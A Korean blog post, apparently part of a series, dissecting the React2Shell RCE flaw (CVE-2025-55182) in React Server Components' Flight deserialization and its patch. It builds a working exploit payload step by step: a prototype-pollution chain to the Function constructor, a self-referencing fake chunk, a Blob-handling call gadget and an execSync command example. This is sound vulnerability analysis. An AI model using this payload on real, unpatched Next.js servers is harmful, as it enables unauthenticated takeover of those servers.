## 개요
2025년 12월에 발견된 `RSC`(React Server Components)의 `React2Shell` 취약점`CVE-2025-55182`은 `Flight 프로토콜` 페이로드를 서버 측에서 역직렬화 시 안전하지 않은 검증으로 인해 발생하는 RCE 취약점입니다.

즉, 클라이언트에서 서버로 보낸 Flight 프로토콜 페이로드에 대한 검증이 완전하지 않아 발생한 문제입니다.

이 공격에 대한 핵심 취약점을 크게 세 가지로 구분할 수 있으며, 전체 공격은 세 취약점의 연계로 완성됩니다.

## PRIMITIVE #1 복습

[Part 1](/posts/react2shell-part1)에서 우리는 Prototype Pollution을 통해 Function 생성자에 접근할 수 있게 되었습니다.

```javascript
files = {
    "0": '["$1:__proto__:constructor:constructor"]',
    "1": '{"x":1}'
}

// 역직렬화 결과
[Function: Function]
```

### 접근 경로

```javascript
let value = { x: 1 };                // Chunk 1
value = value["__proto__"];          // Object.prototype
value = value["constructor"];        // [Function: Object]
value = value["constructor"];        // [Function: Function] 💀
```

### PRIMITIVE #1의 한계

- ✅ Function 생성자에 **접근 가능**
- ❌ Function을 **실제로 실행하지는 못함**
- ❌ 단독으로는 RCE 불가능

**이제 Function을 실행하는 방법을 알아봅시다.**

## PRIMITIVE #2: initializeModelChunk 강제 호출

### 목표

Function 생성자를 **실행**시켜서 임의의 코드를 동작시키기

### initializeModelChunk 함수 역할

```javascript
function initializeModelChunk(chunk) {
  // 1. chunk.value (문자열)을 JSON으로 파싱
  const model = JSON.parse(chunk.value);
  
  // 2. 파싱된 모델을 해석해서 실제 값으로 변환
  chunk.value = resolveModelChunk(chunk, model);
  
  // 3. 상태 변경
  chunk.status = INITIALIZED;
}
```

이 함수는 Chunk를 "활성화"시키는 역할을 합니다. Flight Protocol의 특수 기호들(`$@`, `$F`, `$B` 등)을 해석하여 실제 JavaScript 값으로 변환합니다.

### Chunk.prototype.then과의 관계

```javascript
Chunk.prototype.then = function(resolve, reject) {
  const chunk = this;
  
  switch (chunk.status) {
    case RESOLVED_MODEL:
      initializeModelChunk(chunk);  // ⭐ 여기서 호출
      break;
    case INITIALIZED:
      resolve(chunk.value);
      break;
    // ...
  }
}
```

**핵심:** `status`가 `RESOLVED_MODEL`이면 `initializeModelChunk()`가 자동으로 호출됩니다.

### 공격 아이디어

1. 가짜 Chunk 객체를 만들어서
2. `then` 속성을 `Chunk.prototype.then`으로 설정하고
3. `status`를 `"resolved_model"`로 설정하면
4. `await` 시 `initializeModelChunk()`가 우리가 조작한 데이터로 실행됩니다

## 자기 참조 트릭: `$@0`

### 문제

어떻게 Chunk 0이 자기 자신의 `Chunk.prototype.then`을 참조할 수 있을까?

### 해결: Raw Chunk Reference

Flight Protocol의 `$@` 구문은 **Promise/Chunk를 "raw" 형태로** 반환합니다.

```javascript
case "@":
  return (
    (obj = parseInt(value.slice(2), 16)), 
    getChunk(response, obj)
  );
```

이를 이용하면 Chunk 0이 **자기 자신의 raw chunk**를 참조할 수 있습니다

### 공격 페이로드

```javascript
files = {
    "0": '{"then": "$1:__proto__:then"}',
    "1": '"$@0"'  // Chunk 0 자신을 raw로 참조
}
```

### 실행 과정

```javascript
// 1. Chunk 0 파싱
{
  then: "$1:__proto__:then"  // Chunk 1의 __proto__의 then
}

// 2. Chunk 1 파싱
"$@0"  // Chunk 0의 raw 형태 (Promise 객체)

// 3. Chunk 0의 then 해석
// 경로: $1 → (Chunk 0의 raw) → __proto__ → then
Chunk0.__proto__.then
// = Chunk.prototype.then 💀
```

결과적으로 **Chunk 0의 then 메서드가 Chunk.prototype.then이 됩니다**

## status 설정으로 코드 경로 제어

```javascript
files = {
    "0": '{
        "then": "$1:__proto__:then",
        "status": "resolved_model"  // ⭐
    }',
    "1": '"$@0"'
}
```

### await 시 동작

```javascript
// Next.js 내부
await chunk0;

// 내부적으로 실행됨
chunk0.then(resolve, reject);

// Chunk.prototype.then이 호출됨
Chunk.prototype.then.call(chunk0, resolve, reject);

// 함수 내부에서
switch (chunk0.status) {  // "resolved_model"
  case RESOLVED_MODEL:
    initializeModelChunk(chunk0);  // 💀 호출
    break;
}
```

이제 `initializeModelChunk()`가 **우리가 조작한 chunk0**로 실행됩니다

## Call Gadget: Blob 처리를 이용한 Function 실행

### 문제

`initializeModelChunk()`를 호출할 수 있게 됐지만, 여전히 **Function을 실제로 실행**해야 합니다.

### 해결: `$B` Blob 처리 코드

Flight Protocol에는 Blob 데이터를 처리하는 코드가 있습니다

```javascript
case "B":
  return (
    (obj = parseInt(value.slice(2), 16)),
    response._formData.get(response._prefix + obj)
  );
```

- `response._formData.get()`이 호출됨
- `response._prefix`와 `obj`가 연결되어 인자로 전달됨

### 공격 페이로드 구성

```javascript
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "value": '{"then": "$B0"}',  // Blob 참조
    "_response": {
        "_prefix": "return 1+1; // ",  // 실행할 코드
        "_formData": {
            "get": "$1:constructor:constructor",  // Function 생성자
        },
    },
}
```

### 실행 흐름

```javascript
// 1. initializeModelChunk(crafted_chunk) 호출
const model = JSON.parse(crafted_chunk.value);
// model = { then: "$B0" }

// 2. $B0 해석 시 Blob 처리 코드 실행
response._formData.get(response._prefix + "0")

// 3. 실제로 치환되면
Function("return 1+1; // 0")

// 4. Function 생성자 호출 💀
```

**트릭 설명:**
- `_formData.get`을 **Function 생성자로 설정**
- `_prefix`에 **실행할 JavaScript 코드** 삽입
- `+ "0"`은 주석 처리되어 무시됨 (`// 0`)

## reason: -1 트릭

### 추가 문제

`initializeModelChunk` 내부에는 이런 코드:

```javascript
var rootReference = 
  -1 === chunk.reason 
    ? void 0 
    : chunk.reason.toString(16);
```

`reason`이 -1이 아니면 `toString(16)`이 호출됩니다.

### 해결

```javascript
crafted_chunk = {
    "then": "$1:__proto__:then",
    "status": "resolved_model",
    "reason": -1,  // toString 호출 우회
    "value": '{"then": "$B0"}',
    // ...
}
```

`reason: -1`을 설정하면 `void 0` (undefined)가 반환되어 에러를 피할 수 있습니다.

## 전체 공격 흐름 정리

### 단계별 다이어그램

```
[1단계] 공격자가 조작된 페이로드 전송
   ↓
[2단계] Next.js가 decodeReplyFromBusboy() 호출
   ↓
[3단계] Chunk 0 파싱
{
  then: "$1:__proto__:then",
  status: "resolved_model",
  reason: -1,
  value: '{"then": "$B0"}',
  _response: { ... }
}
   ↓
[4단계] then 값 해석
→ Chunk.prototype.then
   ↓
[5단계] await로 인해 then() 호출
   ↓
[6단계] Chunk.prototype.then 실행
   ↓
[7단계] status 확인: "resolved_model"
→ initializeModelChunk(chunk0) 호출
   ↓
[8단계] chunk0.value 파싱
JSON.parse('{"then": "$B0"}')
→ { then: "$B0" }
   ↓
[9단계] $B0 해석
response._formData.get(response._prefix + "0")
   ↓
[10단계] 실제 호출
Function("악의적인코드;")
   ↓
[11단계] 이 함수가 then으로 반환됨
   ↓
[12단계] await로 인해 함수가 실행됨
   ↓
[13단계] 💀 RCE
```

### 코드로 표현한 흐름

```javascript
// 1. await 시작
await chunk0;

// 2. then 호출
chunk0.then(resolve, reject);
// = Chunk.prototype.then.call(chunk0, resolve, reject);

// 3. Chunk.prototype.then 내부
switch (chunk0.status) {  // "resolved_model"
  case RESOLVED_MODEL:
    initializeModelChunk(chunk0);
}

// 4. initializeModelChunk 내부
const model = JSON.parse(chunk0.value);
// model = { then: "$B0" }

chunk0.value = resolveModelChunk(chunk0, model);

// 5. resolveModelChunk 내부에서 $B0 처리
case "B":
  return chunk0._response._formData.get(
    chunk0._response._prefix + "0"
  );

// 6. 실제 실행
Function("process.mainModule.require('child_process').execSync('calc');")

// 7. 이 함수가 반환되어 chunk0.value.then이 됨
chunk0.value = {
  then: Function("...")
}

// 8. await가 다시 이 then을 호출
chunk0.value.then(resolve, reject);

// 9. Function이 resolve, reject와 함께 호출됨
Function("process.mainModule.require('child_process').execSync('calc');")(resolve, reject);

// 10. 💀 임의의 코드 실행
```

## 왜 이 취약점이 위험한가

### 1. 액션 검증 전에 실행됨

```javascript
// Next.js action-handler.ts
boundActionArguments = await decodeReplyFromBusboy(
    busboy,
    serverModuleMap,
    { temporaryReferences }
)
// ⬆️ 여기서 RCE 발생

// ⬇️ 이 검증은 도달하지도 못함
getActionModIdOrError(actionId);
```

**즉, 유효한 액션이 없어도 공격 가능합니다**

단순히 `Next-Action: foo` 헤더만 보내면 됩니다.

### 2. 인증 불필요

Server Functions의 역직렬화 과정에서 발생하므로:
- 로그인 불필요
- 권한 검사 우회
- 어떤 엔드포인트든 공격 가능

### 3. 완전한 서버 장악

Function 생성자를 얻으면:
- 파일 시스템 접근
- 환경 변수 탈취
- 데이터베이스 접근
- 리버스 셸 연결
- 임의의 명령 실행

## 패치 내용

### 취약점 수정

```javascript
// 패치 전
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  return moduleExports[metadata[NAME]];  // ❌ 검사 없음
}

// 패치 후
export function requireModule<T>(metadata: ClientReference<T>): T {
  const moduleExports = parcelRequire(metadata[ID]);
  if (hasOwnProperty.call(moduleExports, metadata[NAME])) {  // ✅ 검사 추가
    return moduleExports[metadata[NAME]];
  }
  return (undefined: any);
}
```

### 패치 원리

`hasOwnProperty` 체크를 추가하여:
- 객체가 **직접 가진 속성**만 접근 허용
- `__proto__`, `constructor` 같은 프로토타입 체인 속성 차단

```javascript
const obj = { x: 1 };

obj.hasOwnProperty('x');           // true ✅
obj.hasOwnProperty('__proto__');   // false ❌
obj.hasOwnProperty('constructor'); // false ❌
```
